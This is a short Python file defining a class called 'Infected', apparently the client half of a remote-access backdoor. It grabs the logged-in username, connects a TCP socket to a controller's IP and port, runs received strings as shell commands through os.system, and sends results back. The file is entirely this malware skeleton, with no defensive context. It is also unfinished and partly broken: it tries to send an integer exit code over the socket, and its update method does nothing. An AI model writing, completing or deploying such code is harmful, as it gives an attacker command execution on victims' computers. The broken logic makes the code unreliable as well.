import os
import socket
class Infected:
    mySocket = 0 ;
    myUser = "";


    def __init__(self,ip,port):
        self.ServerSocket = (ip,port)
        self.version = 0
        self.myDirection = "aca va la direccion donde va a estar siempre" 
        
    def takeIp(self):
        self.myUser = os.getlogin()
        self.mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
    def apply(self):
        self.mySocket.connect(self.ServerSocket)
        
        
    def reciveCommand(self,command):
        
        data = os.system(command)
        self.sendData(data)
    
    def update(self,cod,version,program):
        self.version = version    
        
    def sendData(self,data):
        self.mySocket.send(data)
        self.mySocket.close()
